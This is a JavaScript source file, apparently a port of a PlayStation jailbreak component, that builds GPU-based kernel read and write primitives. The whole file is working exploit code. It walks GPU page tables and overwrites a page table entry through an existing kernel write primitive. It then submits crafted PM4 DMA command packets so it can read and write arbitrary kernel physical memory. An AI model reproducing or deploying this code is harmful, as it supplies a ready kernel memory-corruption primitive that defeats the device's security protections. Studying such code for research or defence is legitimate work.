// https://github.com/shahrilnet/remote_lua_loader/blob/main/savedata/gpu.lua
// Credit to flatz and shadPS4 project for references

// GPU page table

let sceKernelAllocateMainDirectMemory;
let sceKernelMapDirectMemory;
let sceGnmSubmitCommandBuffers;
let sceGnmSubmitDone;

const GPU_PDE_SHIFT = {
    VALID: 0,
    IS_PTE: 54,
    TF: 56,
    BLOCK_FRAGMENT_SIZE: 59,
};

const GPU_PDE_MASKS = {
    VALID: 1n,
    IS_PTE: 1n,
    TF: 1n,
    BLOCK_FRAGMENT_SIZE: 0x1fn,
};

const GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

function gpu_pde_field(pde, field) {
    const shift = GPU_PDE_SHIFT[field];
    const mask = GPU_PDE_MASKS[field];
    return (pde >> BigInt(shift)) & mask;
}

async function gpu_walk_pt(vmid, virt_addr) {
    await log(`[gpu_walk_pt] vmid: ${vmid}, virt_addr: 0x${virt_addr.toString(16)}`);
    
    const pdb2_addr = get_pdb2_addr(vmid);
    await log(`[gpu_walk_pt] pdb2_addr: 0x${pdb2_addr.toString(16)}`);
    
    const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
    const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
    const pde_index = (virt_addr >> 21n) & 0x1ffn;
    
    await log(`[gpu_walk_pt] indices - pml4e: ${pml4e_index}, pdpe: ${pdpe_index}, pde: ${pde_index}`);
    
    // PDB2
    const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);
    await log(`[gpu_walk_pt] pml4e: 0x${pml4e.toString(16)}`);
    
    if (gpu_pde_field(pml4e, "VALID") !== 1n) {
        await log(`[gpu_walk_pt] ERROR: pml4e not valid`);
        return null;
    }
    
    // PDB1
    const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);
    
    await log(`[gpu_walk_pt] pdpe: 0x${pdpe.toString(16)}`);
    
    if (gpu_pde_field(pdpe, "VALID") !== 1n) {
        await log(`[gpu_walk_pt] ERROR: pdpe not valid`);
        return null;
    }
    
    // PDB0
    const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);
    
    await log(`[gpu_walk_pt] pde: 0x${pde.toString(16)}`);
    
    if (gpu_pde_field(pde, "VALID") !== 1n) {
        await log(`[gpu_walk_pt] ERROR: pde not valid`);
        return null;
    }
    
    if (gpu_pde_field(pde, "IS_PTE") === 1n) {
        await log(`[gpu_walk_pt] IS_PTE, returning 2MB page`);
        return [pde_va, 0x200000n]; // 2MB
    }
    
    // PTB
    const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
    const offset = virt_addr & 0x1fffffn;
    const pt_base_pa = pde & GPU_PDE_ADDR_MASK;
    
    await log(`[gpu_walk_pt] fragment_size: ${fragment_size}, offset: 0x${offset.toString(16)}`);
    
    let pte_index, pte;
    let pte_va, page_size;
    
    if (fragment_size === 4n) {
        pte_index = offset >> 16n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        pte = kernel.read_qword(pte_va);
        
        if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
            pte_index = (virt_addr & 0xffffn) >> 13n;
            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
            page_size = 0x2000n; // 8KB
            await log(`[gpu_walk_pt] fragment_size=4, TF=1, page_size: 8KB`);
        } else {
            page_size = 0x10000n; // 64KB
            await log(`[gpu_walk_pt] fragment_size=4, TF=0, page_size: 64KB`);
        }
    } else if (fragment_size === 1n) {
        pte_index = offset >> 13n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        page_size = 0x2000n; // 8KB
        await log(`[gpu_walk_pt] fragment_size=1, page_size: 8KB`);
    }
    
    await log(`[gpu_walk_pt] returning pte_va: 0x${pte_va.toString(16)}, page_size: 0x${page_size.toString(16)}`);
    return [pte_va, page_size];
}

// Kernel r/w primitives based on GPU DMA

let gpu = {};

gpu.dmem_size = 2n * 0x100000n; // 2MB

gpu.setup = async function() {
    await log(`[gpu.setup] Starting GPU setup`);
    
    check_kernel_rw();
    
    const libSceGnmDriver = load_prx("/system/common/lib/libSceGnmDriver.sprx");
    
    // Put these into global to make life easier
    sceKernelAllocateMainDirectMemory = dlsym(LIBKERNEL_HANDLE, "sceKernelAllocateMainDirectMemory");
    sceKernelMapDirectMemory = dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory");
    sceGnmSubmitCommandBuffers = dlsym(libSceGnmDriver, "sceGnmSubmitCommandBuffers");
    sceGnmSubmitDone = dlsym(libSceGnmDriver, "sceGnmSubmitDone");
    
    await log(`[gpu.setup] Loaded symbols`);
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    await log(`[gpu.setup] Allocating victim memory`);
    const victim_va = await alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    await log(`[gpu.setup] victim_va: 0x${victim_va.toString(16)}`);
    
    await log(`[gpu.setup] Allocating transfer memory`);
    const transfer_va = await alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    await log(`[gpu.setup] transfer_va: 0x${transfer_va.toString(16)}`);
    
    await log(`[gpu.setup] Allocating command memory`);
    const cmd_va = await alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    await log(`[gpu.setup] cmd_va: 0x${cmd_va.toString(16)}`);
    
    const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
    await log(`[gpu.setup] curproc_cr3: 0x${curproc_cr3.toString(16)}`);
    
    const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);
    await log(`[gpu.setup] victim_real_pa: 0x${victim_real_pa.toString(16)}`);
    
    const result = await get_ptb_entry_of_relative_va(victim_va);
    if (!result) {
        await log(`[gpu.setup] ERROR: get_ptb_entry_of_relative_va failed`);
        throw new Error("failed to setup gpu primitives");
    }
    
    const [victim_ptbe_va, page_size] = result;
    await log(`[gpu.setup] victim_ptbe_va: 0x${victim_ptbe_va.toString(16)}, page_size: 0x${page_size.toString(16)}`);
    
    if (!victim_ptbe_va || page_size !== gpu.dmem_size) {
        await log(`[gpu.setup] ERROR: page_size mismatch. Expected: 0x${gpu.dmem_size.toString(16)}, Got: 0x${page_size.toString(16)}`);
        throw new Error("failed to setup gpu primitives");
    }
    
    await log(`[gpu.setup] Setting victim to read-only`);
    if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, BigInt(prot_ro)) === 0xffffffffffffffffn) {
        await log(`[gpu.setup] ERROR: mprotect failed`);
        throw new Error("mprotect() error");
    }
    
    const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
    const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);
    
    await log(`[gpu.setup] initial_victim_ptbe_for_ro: 0x${initial_victim_ptbe_for_ro.toString(16)}`);
    await log(`[gpu.setup] cleared_victim_ptbe_for_ro: 0x${cleared_victim_ptbe_for_ro.toString(16)}`);
    
    gpu.victim_va = victim_va;
    gpu.transfer_va = transfer_va;
    gpu.cmd_va = cmd_va;
    gpu.victim_ptbe_va = victim_ptbe_va;
    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
    
    await log(`[gpu.setup] GPU setup complete!`);
};

gpu.pm4_type3_header = function(opcode, count) {
    
    const packet_type = 3n;
    const shader_type = 1n;  // compute shader
    const predicate = 0n;    // predicate disable
    
    // BUGFIX: Convert opcode and count to BigInt
    const opcode_big = typeof opcode === "bigint" ? opcode : BigInt(opcode);
    const count_big = typeof count === "bigint" ? count : BigInt(count);
    
    const result = (
        (predicate & 0x0n) |                           // Predicated version of packet when set
        ((shader_type & 0x1n) << 1n) |                 // 0: Graphics, 1: Compute Shader
        ((opcode_big & 0xffn) << 8n) |                 // IT opcode
        (((count_big - 1n) & 0x3fffn) << 16n) |        // Number of DWORDs - 1 in the information body
        ((packet_type & 0x3n) << 30n)                  // Packet identifier. It should be 3 for type 3 packets
    );
    
    return result & 0xFFFFFFFFn;
};

gpu.pm4_dma_data = async function(dest_va, src_va, length) {
    await log(`[pm4_dma_data] dest_va: 0x${dest_va.toString(16)}, src_va: 0x${src_va.toString(16)}, length: ${length}`);
    
    const count = 6n;
    const bufsize = Number(4n * (count + 1n));
    const opcode = 0x50n;
    const command_len = BigInt(length) & 0x1fffffn;
    
    const pm4 = malloc(bufsize);
    await log(`[pm4_dma_data] Allocated pm4 buffer at: 0x${pm4.toString(16)}, size: ${bufsize}`);
    
    const dma_data_header = (
        (0n & 0x1n) |                    // engine
        ((0n & 0x1n) << 12n) |           // src_atc
        ((2n & 0x3n) << 13n) |           // src_cache_policy
        ((1n & 0x1n) << 15n) |           // src_volatile
        ((0n & 0x3n) << 20n) |           // dst_sel (DmaDataDst enum)
        ((0n & 0x1n) << 24n) |           // dst_atc
        ((2n & 0x3n) << 25n) |           // dst_cache_policy
        ((1n & 0x1n) << 27n) |           // dst_volatile
        ((0n & 0x3n) << 29n) |           // src_sel (DmaDataSrc enum)
        ((1n & 0x1n) << 31n)             // cp_sync
    ) & 0xFFFFFFFFn;
    
    const header = gpu.pm4_type3_header(opcode, count);
    await log(`[pm4_dma_data] PM4 header: 0x${header.toString(16)}`);
    await log(`[pm4_dma_data] DMA data header: 0x${dma_data_header.toString(16)}`);
    
    write32(pm4, header); // pm4 header
    write32(pm4 + 0x4n, dma_data_header); // dma data header (copy: mem -> mem)
    write32(pm4 + 0x8n, src_va & 0xFFFFFFFFn);
    write32(pm4 + 0xcn, (src_va >> 32n) & 0xFFFFFFFFn); // BUGFIX: Mask high bits
    write32(pm4 + 0x10n, dest_va & 0xFFFFFFFFn);
    write32(pm4 + 0x14n, (dest_va >> 32n) & 0xFFFFFFFFn); // BUGFIX: Mask high bits
    write32(pm4 + 0x18n, command_len & 0xFFFFFFFFn); // BUGFIX: Ensure 32-bit
    
    const buffer = read_buffer(pm4, bufsize);
    await log(`[pm4_dma_data] Created DMA command buffer, length: ${buffer.length}`);
    return buffer;
};

gpu.submit_dma_data_command = async function(dest_va, src_va, size) {
    await log(`[submit_dma] dest_va: 0x${dest_va.toString(16)}, src_va: 0x${src_va.toString(16)}, size: ${size}`);
    
    const dcb_count = 1;
    const dcb_gpu_addr = malloc(dcb_count * 8);
    const dcb_sizes_in_bytes = malloc(dcb_count * 4);
    
    await log(`[submit_dma] dcb_gpu_addr: 0x${dcb_gpu_addr.toString(16)}, dcb_sizes_in_bytes: 0x${dcb_sizes_in_bytes.toString(16)}`);
    
    // Prep command buf
    const dma_data = await gpu.pm4_dma_data(dest_va, src_va, size);
    write_buffer(gpu.cmd_va, dma_data); // prep dma cmd
    
    await log(`[submit_dma] Wrote DMA command to cmd_va: 0x${gpu.cmd_va.toString(16)}`);
    
    // Prep param
    write64(dcb_gpu_addr, gpu.cmd_va);
    write32(dcb_sizes_in_bytes, BigInt(dma_data.length) & 0xFFFFFFFFn); // BUGFIX: Ensure 32-bit
    
    await log(`[submit_dma] Submitting to GPU...`);
    
    // Submit to GPU
    const ret = call(sceGnmSubmitCommandBuffers, BigInt(dcb_count), dcb_gpu_addr, dcb_sizes_in_bytes, 0n, 0n);
    if (ret !== 0n) {
        await log(`[submit_dma] ERROR: sceGnmSubmitCommandBuffers failed with: 0x${ret.toString(16)}`);
        throw new Error("sceGnmSubmitCommandBuffers() error: " + toHex(ret));
    }
    
    await log(`[submit_dma] Command submitted, calling SubmitDone...`);
    
    // Inform GPU that current submission is done
    const ret2 = call(sceGnmSubmitDone);
    if (ret2 !== 0n) {
        await log(`[submit_dma] ERROR: sceGnmSubmitDone failed with: 0x${ret2.toString(16)}`);
        throw new Error("sceGnmSubmitDone() error: " + toHex(ret2));
    }
    
    await log(`[submit_dma] DMA operation complete`);
};

gpu.transfer_physical_buffer = async function(phys_addr, size, is_write) {
    await log(`[transfer_phys] phys_addr: 0x${phys_addr.toString(16)}, size: ${size}, is_write: ${is_write}`);
    
    const trunc_phys_addr = phys_addr & ~(gpu.dmem_size - 1n);
    const offset = phys_addr - trunc_phys_addr;
    
    await log(`[transfer_phys] trunc_phys_addr: 0x${trunc_phys_addr.toString(16)}, offset: 0x${offset.toString(16)}`);
    
    if (offset + BigInt(size) > gpu.dmem_size) {
        await log(`[transfer_phys] ERROR: size overflow. offset: 0x${offset.toString(16)}, size: ${size}, dmem_size: 0x${gpu.dmem_size.toString(16)}`);
        throw new Error("error: trying to write more than direct memory size: " + size);
    }
    
    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;
    
    // Remap PTD
    await log(`[transfer_phys] Setting victim to read-only`);
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, BigInt(prot_ro)) === 0xffffffffffffffffn) {
        await log(`[transfer_phys] ERROR: mprotect(RO) failed`);
        throw new Error("mprotect() error");
    }
    
    nanosleep(1000000);
    
    const new_ptb = gpu.cleared_victim_ptbe_for_ro | trunc_phys_addr;
    await log(`[transfer_phys] Writing new PTB entry: 0x${new_ptb.toString(16)} to 0x${gpu.victim_ptbe_va.toString(16)}`);
    kernel.write_qword(gpu.victim_ptbe_va, new_ptb);
    
    await log(`[transfer_phys] Setting victim to read-write`);
    if (syscall(SYSCALL.mprotect, gpu.victim_va, gpu.dmem_size, BigInt(prot_rw)) === 0xffffffffffffffffn) {
        await log(`[transfer_phys] ERROR: mprotect(RW) failed`);
        throw new Error("mprotect() error");
    }
    
    let src, dst;
    
    if (is_write) {
        src = gpu.transfer_va;
        dst = gpu.victim_va + offset;
        await log(`[transfer_phys] WRITE: src=transfer_va, dst=victim_va+offset (0x${dst.toString(16)})`);
    } else {
        src = gpu.victim_va + offset;
        dst = gpu.transfer_va;
        await log(`[transfer_phys] READ: src=victim_va+offset (0x${src.toString(16)}), dst=transfer_va`);
    }
    
    // Do the DMA operation
    await gpu.submit_dma_data_command(dst, src, size);
};

gpu.read_buffer = async function(addr, size) {
    await log(`[gpu.read_buffer] addr: 0x${addr.toString(16)}, size: ${size}`);
    
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        await log(`[gpu.read_buffer] ERROR: virt_to_phys failed for addr: 0x${addr.toString(16)}`);
        throw new Error("failed to translate " + toHex(addr) + " to physical addr");
    }
    
    await log(`[gpu.read_buffer] Translated to phys_addr: 0x${phys_addr.toString(16)}`);
    
    await gpu.transfer_physical_buffer(phys_addr, size, false);
    
    const result = read_buffer(gpu.transfer_va, size);
    await log(`[gpu.read_buffer] Read ${result.length} bytes from transfer buffer`);
    return result;
};

gpu.write_buffer = async function(addr, buf) {
    await log(`[gpu.write_buffer] addr: 0x${addr.toString(16)}, buf.length: ${buf.length}`);
    
    const phys_addr = virt_to_phys(addr, kernel.addr.kernel_cr3);
    if (!phys_addr) {
        await log(`[gpu.write_buffer] ERROR: virt_to_phys failed for addr: 0x${addr.toString(16)}`);
        throw new Error("failed to translate " + toHex(addr) + " to physical addr");
    }
    
    await log(`[gpu.write_buffer] Translated to phys_addr: 0x${phys_addr.toString(16)}`);
    
    write_buffer(gpu.transfer_va, buf); // prepare data for write
    await gpu.transfer_physical_buffer(phys_addr, buf.length, true);
};

gpu.read_byte = async function(kaddr) {
    await log(`[gpu.read_byte] kaddr: 0x${kaddr.toString(16)}`);
    const value = await gpu.read_buffer(kaddr, 1);
    const result = value && value.length === 1 ? BigInt(value[0]) : null;
    await log(`[gpu.read_byte] result: 0x${result ? result.toString(16) : 'null'}`);
    return result;
};

gpu.read_word = async function(kaddr) {
    await log(`[gpu.read_word] kaddr: 0x${kaddr.toString(16)}`);
    const value = await gpu.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) {
        await log(`[gpu.read_word] ERROR: invalid buffer length`);
        return null;
    }
    const result = BigInt(value[0]) | (BigInt(value[1]) << 8n);
    await log(`[gpu.read_word] result: 0x${result.toString(16)}`);
    return result;
};

gpu.read_dword = async function(kaddr) {
    await log(`[gpu.read_dword] kaddr: 0x${kaddr.toString(16)}`);
    const value = await gpu.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) {
        await log(`[gpu.read_dword] ERROR: invalid buffer length: ${value ? value.length : 'null'}`);
        return null;
    }
    
    // BUGFIX: Ensure proper little-endian byte order
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    
    await log(`[gpu.read_dword] result: 0x${result.toString(16)}`);
    return result;
};

gpu.read_qword = async function(kaddr) {
    await log(`[gpu.read_qword] kaddr: 0x${kaddr.toString(16)}`);
    const value = await gpu.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) {
        await log(`[gpu.read_qword] ERROR: invalid buffer length: ${value ? value.length : 'null'}`);
        return null;
    }
    
    // BUGFIX: Ensure proper little-endian byte order
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    
    await log(`[gpu.read_qword] result: 0x${result.toString(16)}`);
    return result;
};

gpu.hex_dump = async function(kaddr, size) {
    size = size || 0x40;
    await log(`[gpu.hex_dump] kaddr: 0x${kaddr.toString(16)}, size: 0x${size.toString(16)}`);
    // Assuming hex_dump function exists elsewhere
    return hex_dump(await gpu.read_buffer(kaddr, size), kaddr);
};

gpu.write_byte = async function(dest, value) {
    await log(`[gpu.write_byte] dest: 0x${dest.toString(16)}, value: 0x${value.toString(16)}`);
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    await gpu.write_buffer(dest, buf);
};

gpu.write_word = async function(dest, value) {
    await log(`[gpu.write_word] dest: 0x${dest.toString(16)}, value: 0x${value.toString(16)}`);
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    await gpu.write_buffer(dest, buf);
};

gpu.write_dword = async function(dest, value) {
    await log(`[gpu.write_dword] dest: 0x${dest.toString(16)}, value: 0x${value.toString(16)}`);
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    await gpu.write_buffer(dest, buf);
};

gpu.write_qword = async function(dest, value) {
    await log(`[gpu.write_qword] dest: 0x${dest.toString(16)}, value: 0x${value.toString(16)}`);
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    await gpu.write_buffer(dest, buf);
};

// Misc functions

async function alloc_main_dmem(size, prot, flag) {
    if (!size || prot === null || prot === undefined) {
        await log(`[alloc_main_dmem] ERROR: invalid parameters`);
        throw new Error("alloc_main_dmem: size and prot are required");
    }
    
    const out = malloc(8);
    const mem_type = 1n; // 1-10
    
    const size_big = typeof size === "bigint" ? size : BigInt(size);
    const prot_big = typeof prot === "bigint" ? prot : BigInt(prot);
    const flag_big = typeof flag === "bigint" ? flag : BigInt(flag);
    
    await log(`[alloc_main_dmem] Allocating size: 0x${size_big.toString(16)}, prot: 0x${prot_big.toString(16)}, flag: 0x${flag_big.toString(16)}`);
    
    const ret = call(sceKernelAllocateMainDirectMemory, size_big, size_big, mem_type, out);
    if (ret !== 0n) {
        await log(`[alloc_main_dmem] ERROR: sceKernelAllocateMainDirectMemory failed: 0x${ret.toString(16)}`);
        throw new Error("sceKernelAllocateMainDirectMemory() error: " + toHex(ret));
    }
    
    const phys_addr = read64(out);
    await log(`[alloc_main_dmem] Allocated phys_addr: 0x${phys_addr.toString(16)}`);
    
    write64(out, 0n);
    
    const ret2 = call(sceKernelMapDirectMemory, out, size_big, prot_big, flag_big, phys_addr, size_big);
    if (ret2 !== 0n) {
        await log(`[alloc_main_dmem] ERROR: sceKernelMapDirectMemory failed: 0x${ret2.toString(16)}`);
        throw new Error("sceKernelMapDirectMemory() error: " + toHex(ret2));
    }
    
    const virt_addr = read64(out);
    await log(`[alloc_main_dmem] Mapped to virt_addr: 0x${virt_addr.toString(16)}`);
    
    return virt_addr;
}

function get_curproc_vmid() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);
    const vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID);
    return Number(vmid);
}

function get_gvmspace(vmid) {
    if (vmid === null || vmid === undefined) {
        throw new Error("vmid is required");
    }
    const vmid_big = typeof vmid === "bigint" ? vmid : BigInt(vmid);
    const gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE;
    return gvmspace_base + vmid_big * kernel_offset.SIZEOF_GVMSPACE;
}

function get_pdb2_addr(vmid) {
    const gvmspace = get_gvmspace(vmid);
    return kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_PAGE_DIR_VA);
}

function get_relative_va(vmid, va) {
    if (typeof va !== "bigint") {
        throw new Error("va must be BigInt");
    }
    
    const gvmspace = get_gvmspace(vmid);
    
    const size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE);
    const start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA);
    const end_addr = start_addr + size;
    
    if (va >= start_addr && va < end_addr) {
        return va - start_addr;
    }
    
    return null;
}

async function get_ptb_entry_of_relative_va(virt_addr) {
    await log(`[get_ptb_entry] virt_addr: 0x${virt_addr.toString(16)}`);
    
    const vmid = get_curproc_vmid();
    await log(`[get_ptb_entry] vmid: ${vmid}`);
    
    const relative_va = get_relative_va(vmid, virt_addr);
    
    if (!relative_va && relative_va !== 0n) {
        await log(`[get_ptb_entry] ERROR: invalid virtual addr`);
        throw new Error("invalid virtual addr " + toHex(virt_addr) + " for vmid " + vmid);
    }
    
    await log(`[get_ptb_entry] relative_va: 0x${relative_va.toString(16)}`);
    
    return await gpu_walk_pt(vmid, relative_va);
}